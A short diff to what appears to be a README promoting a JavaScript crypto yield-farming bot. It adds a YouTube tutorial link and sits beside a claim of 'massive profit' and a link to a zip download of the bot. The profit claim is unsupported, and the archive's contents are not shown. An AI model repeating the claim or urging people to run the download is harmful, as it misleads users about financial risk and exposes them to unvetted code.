@@ -5,6 +5,8 @@ The default configuration turns a massive profit in this volatile market. This b
 
 Here's a straightforward YouTube video on how to configure it and run it properly.
 
+https://www.youtube.com/watch?v=HUVC0Ah1rV4
+
 You can download the zip file of the bot here
 
 https://github.com/Theawesomecodermike/JavaScript-yield-farming-bot-v2-stoploss/raw/main/Yield-farming-bot-V2-with-stoploss.zip
